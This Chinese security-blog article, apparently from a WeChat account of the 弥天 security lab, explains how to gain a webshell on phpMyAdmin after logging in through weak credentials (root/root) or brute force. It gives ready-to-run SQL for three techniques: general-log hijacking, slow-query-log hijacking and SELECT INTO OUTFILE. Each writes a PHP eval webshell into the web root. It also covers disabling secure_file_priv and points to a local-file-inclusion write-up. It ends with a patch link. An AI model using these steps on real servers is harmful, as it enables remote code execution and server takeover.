> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/861dMFu5gKAXJY1gZMRL4A)

  

网安引领时代，弥天点亮未来 

  

  

![](https://mmbiz.qpic.cn/mmbiz_png/MjmKb3ap0hDCVZx96ZMibcJI8GEwNnAyx4yiavy2qelCaTeSAibEeFrVtpyibBCicjbzwDkmBJDj9xBWJ6ff10OTQ2w/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

  

**0x00 写在前面**  

 **本次测试仅供学习使用，如若非法他用，与平台和本文作者无关，需自行负责！**

![](https://mmbiz.qpic.cn/mmbiz_png/MjmKb3ap0hDCVZx96ZMibcJI8GEwNnAyx4yiavy2qelCaTeSAibEeFrVtpyibBCicjbzwDkmBJDj9xBWJ6ff10OTQ2w/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

  

**0x01 漏洞介绍**

phpMyAdmin 是一个以 PHP 为基础，以 Web-Base 方式架构在网站主机上的 MySQL 的数据库管理工具，让管理者可用 Web 接口管理 MySQL 数据库。借由此 Web 接口可以成为一个简易方式输入繁杂 SQL 语法的较佳途径，尤其要处理大量资料的汇入及汇出更为方便。

phpMyAdmin 跟其他 PHP 程序一样在网页服务器上执行，可以在远端管理 MySQL 数据库，方便的建立、修改、删除数据库及资料表。

在通过对目标进行信息收集、目录扫描后，发现存在 phpmyadmin 后台，可通过弱口令（可以直接尝试下账号 root 密码 root）或者暴力破解进入管理后台。分享一些真实环境中常用到后台 getshell 的方法。

![](https://mmbiz.qpic.cn/mmbiz_png/MjmKb3ap0hDCVZx96ZMibcJI8GEwNnAyx4yiavy2qelCaTeSAibEeFrVtpyibBCicjbzwDkmBJDj9xBWJ6ff10OTQ2w/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

  

**0x02 测试版本**  

访问 / phpMyadmin/README

![](https://mmbiz.qpic.cn/mmbiz_png/MjmKb3ap0hBs43BA0yQx3R7WOm47Iic8qibnVXI7blpNVSbSia8p7oGlDxr1YKb206MwemWD2YqHY5vqgBcOAYfCQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/MjmKb3ap0hDCVZx96ZMibcJI8GEwNnAyx4yiavy2qelCaTeSAibEeFrVtpyibBCicjbzwDkmBJDj9xBWJ6ff10OTQ2w/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

  

**0x03 漏洞复现**  

  

1. 访问漏洞环境

![](https://mmbiz.qpic.cn/mmbiz_png/MjmKb3ap0hBs43BA0yQx3R7WOm47Iic8qnS9rZ0BVVOCadSwchrMDFCPGVkT91uLbSWlUZIOUibPzBeTeiaUhFicibg/640?wx_fmt=png)

2. 通过工具对 phpMyadmin 平台进行暴力破解，成功登录后台，存在弱口令 root/root

![](https://mmbiz.qpic.cn/mmbiz_png/MjmKb3ap0hBs43BA0yQx3R7WOm47Iic8qcjJDLwY6UM1r1ojYLToE40DibyMYCiaCW05eQse3zI85ic4U1lIMXt7Ow/640?wx_fmt=png)

成功登录到后台 

![](https://mmbiz.qpic.cn/mmbiz_png/MjmKb3ap0hBs43BA0yQx3R7WOm47Iic8q9y0z1HwrCFDIpStDFDWTibhaka96D62bia0uZpfiaM7YVjptq3Oalwsjg/640?wx_fmt=png)

**方法 1**

#### 开启全局日志 getshell

1. 利用条件为有操作权限  

2. 查看配置

```
show variables like '%general%';

```

![](https://mmbiz.qpic.cn/mmbiz_png/MjmKb3ap0hBs43BA0yQx3R7WOm47Iic8q4UOeqY8UD3ws2qC7cVHibICPjibWymaY32VvEXuo9ycusAkKaXO3fVyg/640?wx_fmt=png)

‍

       3. 开启 general log 模式

```
set global general_log = on;

```

![](https://mmbiz.qpic.cn/mmbiz_png/MjmKb3ap0hBs43BA0yQx3R7WOm47Iic8qFGic0vmyMfDOagAls9HgBAzedGaMY6mOSK8Lx4xHFkyKQGo7jXdwDNg/640?wx_fmt=png)

      4. 设置日志目录为 shell 地址（绝对路径通过 phpinfo 获取）

![](https://mmbiz.qpic.cn/mmbiz_png/MjmKb3ap0hBs43BA0yQx3R7WOm47Iic8qib2kWTWoRW7fH9pZsS5LMwvBQKQWJgtedzGMiaiaicPVxyS1kQzLviaYR2g/640?wx_fmt=png)

```
set global general_log_file = 'C:/phpStudy/WWW/tm.php';

```

![](https://mmbiz.qpic.cn/mmbiz_png/MjmKb3ap0hBs43BA0yQx3R7WOm47Iic8qHPKGMUjSia1zsFUJtDrbXzGsGc0ojibUpma13ZkXEHcrfxOTqkOsE9kQ/640?wx_fmt=png)

    5. 写入 shell 内容，将记录到日志  

```
select '<?php eval($_POST[cmd]);?>'

```

![](https://mmbiz.qpic.cn/mmbiz_png/MjmKb3ap0hBs43BA0yQx3R7WOm47Iic8qiaIWe8CVZu7aFOR6FMoqX4eSI8rwNHXvRz0TtYAKJy0sgYXHhPXFxxg/640?wx_fmt=png)

6. 成功写入文件，中国蚁剑成功连接。  

![](https://mmbiz.qpic.cn/mmbiz_png/MjmKb3ap0hBs43BA0yQx3R7WOm47Iic8qaByWFow0zW33B8Wia2Pf2syCfBcQAJibuWrmbHO4aUWz4NTFL3XBQsCA/640?wx_fmt=png)

 **方法 2**

#### 使用慢查询日志 getshell

#### 记录所有执行时间超过 long_query_time 秒的所有查询或者不使用索引的查询。默认情况下，MySQL 数据库是不开启慢查询日志的，long_query_time 的默认值为 10（即 10 秒，通常设置为 1 秒），即运行 10 秒以上的语句是慢查询语句。

1. 查看配置

```
show variables like '%slow%';

```

![](https://mmbiz.qpic.cn/mmbiz_png/MjmKb3ap0hBs43BA0yQx3R7WOm47Iic8qyHhbgOEa9BYPEbWUO8d5ejVibZODABlpvjPOzsPtxUKG3lhcWWgLtQA/640?wx_fmt=png)

2. 修改日志文件绝对路径及文件名，（绝对路径通过 phpinfo 获取）  

```
set global slow_query_log_file = 'C:/phpStudy/WWW/mt.php';

```

![](https://mmbiz.qpic.cn/mmbiz_png/MjmKb3ap0hBs43BA0yQx3R7WOm47Iic8qMozfyQTmtwbnX9ibmtoiajZvnV1icQvaTOJTl1tdvCYNqTrjqoSJOfvMw/640?wx_fmt=png)

3. 启用慢查询日志  

```
set GLOBAL slow_query_log=on;

```

![](https://mmbiz.qpic.cn/mmbiz_png/MjmKb3ap0hBs43BA0yQx3R7WOm47Iic8qYpswcXaD9ICRcdg6Tfias9JicwnEBUVicqLSK1bt5JY8FugO5ZgBE8amw/640?wx_fmt=png)

4. 通过慢查询写 shell  

```
select '<?php eval($_POST[cmd]);?>' from mysql.db where sleep(10);

```

![](https://mmbiz.qpic.cn/mmbiz_png/MjmKb3ap0hBs43BA0yQx3R7WOm47Iic8qcLcKZjY6EEIzN2wiasy74E4GBjYKJu2VJ0bs2uA8iazzrnWvvf0NRtwA/640?wx_fmt=png)

5. 成功写入文件，中国蚁剑成功连接。

![](https://mmbiz.qpic.cn/mmbiz_png/MjmKb3ap0hBs43BA0yQx3R7WOm47Iic8qPNpwebbGZGs944mzQaG8UDFMH9KHYu5Lx4AfImKjs4HmFFFRlM55yw/640?wx_fmt=png)

**方法 3**

#### select into outfile 直接写入

#### 1. 利用条件

*   对 web 目录需要有写权限能够使用单引号
    
*   知道绝对路径
    
*   secure_file_priv 没有具体值
    

2. 查看有没有配置 secure_file_priv

```
show global variables like '%secure%';

```

![](https://mmbiz.qpic.cn/mmbiz_png/MjmKb3ap0hBs43BA0yQx3R7WOm47Iic8qj14CkRa5Yic1osVh2Lp8pDQ8kfXncLM72Q1FO1ObKxAytInN7NCx9Bg/640?wx_fmt=png)

注意：

secure_file_priv 是用来限制 load dumpfile、into outfile、load_file() 函数在哪个目录下拥有上传和读取文件的权限。在 mysql 5.6.34 版本以后 secure_file_priv 的值默认为 NULL。如下关于 secure_file_priv 的配置介绍

*   1、secure_file_priv 的值为 null ，表示限制 mysqld 不允许导入 | 导出
    
*   2、当 secure_file_priv 的值为 / tmp/ ，表示限制 mysqld 的导入 | 导出只能发生在 / tmp / 目录下
    
*   3、当 secure_file_priv 的值没有具体值时，表示不对 mysqld 的导入 | 导出做限制
    

这里为 nulll，所以没有写权限

这里演示通过获得 shell 修改文件修改 secure_file_priv 的值为空，在 mysql/my.ini 中查看是否有 secure_file_priv 的参数，如果没有的话我们就添加 secure_file_priv = '' ，重启服务器即可。

![](https://mmbiz.qpic.cn/mmbiz_png/MjmKb3ap0hBs43BA0yQx3R7WOm47Iic8qzvZezEH0uG9Z3u3eIS6lAvTYCTSe6nWke5MVS277snPD5u16S6EHibQ/640?wx_fmt=png)

```
select '<?php @eval($_POST[cmd]);?>' into outfile 'C:/phpStudy/WWW/yz.php';

```

3. 成功写入 shell，中国蚁剑成功连接。  

![](https://mmbiz.qpic.cn/mmbiz_png/MjmKb3ap0hBs43BA0yQx3R7WOm47Iic8qKSJkKIoibnQh16IldR6piaqfzdDfOEkASAy2PKNRtbjZe5JlamDia6ohA/640?wx_fmt=png)

#### **方法 4**

#### 利用 phpmyadmin4.8.x 本地文件包含漏洞 getshell

通过包含 sedsion 文件的方法来 getshell

因环境问题，请参考

```
https://www.cnblogs.com/0nc3/p/12071314.html

```

![](https://mmbiz.qpic.cn/mmbiz_png/MjmKb3ap0hDCVZx96ZMibcJI8GEwNnAyx4yiavy2qelCaTeSAibEeFrVtpyibBCicjbzwDkmBJDj9xBWJ6ff10OTQ2w/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

  

**0x04 修复建议**  

  

目前厂商已发布升级补丁以修复漏洞，补丁获取链接：

```
https://github.com/phpmyadmin/phpmyadmin/commit/d09ab9bc9d634ad08b866d42bb8c4109869d38d2

```

弥天简介

学海浩茫，予以风动，必降弥天之润！弥天弥天安全实验室成立于 2019 年 2 月 19 日，主要研究安全防守溯源、威胁狩猎、漏洞复现、工具分享等不同领域。目前主要力量为民间白帽子，也是民间组织。主要以技术共享、交流等不断赋能自己，赋能安全圈，为网络安全发展贡献自己的微薄之力。

口号 网安引领时代，弥天点亮未来

![](https://mmbiz.qpic.cn/mmbiz_gif/b96CibCt70iaaqjXT4YxgHVARD1NNv0RvKtiaAvXhmruVqgavPY3stwrfvLKetGycKUfxIq3Xc6F6dhU7eb4oh2gg/640?wx_fmt=gif&wxfrom=5&wx_lazy=1) 

知识分享完了

喜欢别忘了关注我们哦~

学海浩茫，

予以风动，

必降弥天之润！

   弥  天

安全实验室  

![](https://mmbiz.qpic.cn/mmbiz_jpg/MjmKb3ap0hDyTJAqicycpl7ZakwfehdOgvOqd7bOUjVTdwxpfudPLOJcLiaSZnMC7pDDdlIF4TWBWWYnD04wX7uA/640?wx_fmt=jpeg&wxfrom=5&wx_lazy=1&wx_co=1)